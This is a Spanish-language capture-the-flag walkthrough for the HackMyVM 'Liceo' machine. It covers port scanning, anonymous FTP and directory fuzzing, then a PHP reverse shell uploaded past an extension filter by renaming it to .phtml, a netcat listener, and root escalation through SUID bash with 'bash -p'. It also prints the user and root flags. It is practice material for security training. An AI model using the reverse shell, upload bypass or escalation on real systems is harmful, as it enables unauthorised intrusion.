---
icon: flag
---

# Liceo HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 03:53 EDT
Nmap scan report for 192.168.5.64
Host is up (0.0024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000          191 Feb 01  2024 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.50
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)
|_  256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Liceo
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:C0:50:50 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
```

Veremos varias cosas interesantes, un puerto `80` y un `FTP` en el que parece que nos podemos conectar de forma anonima, vamos a probar a conectarnos al `FTP` para ver que contiene de forma anonima.

## FTP

```shell
ftp anonymous@<IP>
```

Info:

```
229 Entering Extended Passive Mode (|||31376|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000          191 Feb 01  2024 note.txt
226 Directory send OK.
```

Veremos que hay una `note.txt` vamos a descargarnosla:

```shell
get note.txt
```

Ahora si la leemos veremos lo siguiente:

```
Hi Matias, I have left on the web the continuations of today's work, 
would you mind contiuing in your turn and make sure that the web will be secure? 
Above all, we dont't want intruders...
```

No nos dice nada interesante, por lo que vamos a meternos dentro del puerto `80`, una vez dentro veremos una pagina web aparentemente normal, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.64/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/uploads              (Status: 200) [Size: 743]
/images               (Status: 200) [Size: 6715]
/upload.php           (Status: 200) [Size: 371]
/index.html           (Status: 200) [Size: 21487]
/css                  (Status: 200) [Size: 1746]
/js                   (Status: 200) [Size: 1347]
Progress: 123415 / 882244 (13.99%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 123550 / 882244 (14.00%)
===============================================================
Finished
===============================================================
```

Veremos una cosa interesante que es `/upload.php`, si entramos dentro veremos una seccion en la que podremos subir un archivo, vamos a probar a subir un archivo `.php`.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora si lo intentamos subir nos dara un error:

```
Error: No se permiten archivos con la extensión php.
```

Por lo que vamos a probar a intentar `bypassear` la extension de esta forma:

## Escalate user www-data

```shell
mv shell.php shell.phtml
```

Ahora si subimos el `.phtml` veremos lo siguiente:

```
El archivo shell.phtml se ha subido correctamente.
```

Vemos que se ha subido de forma correcta, vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si nos vamos en la `URL` a la siguiente ruta donde estan subidos todos los archivos, veremos lo siguiente:

```
URL = http://<IP>/uploads
```

Ahora le daremos a dicho archivo y si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.64] 53456
whoami
www-data
```

Vemos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si listamos el binario de la `bash` veremos que tiene permisos `SUID`:

```
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Con esto veremos que seremos `root`, por lo que leeremos las `flags` del usuario y de `root`.

> user.txt

```
71ab613fa286844425523780a7ebbab2
```

> root.txt

```
BF9A57023EDD8CFAB92B8EA516676B0D
```
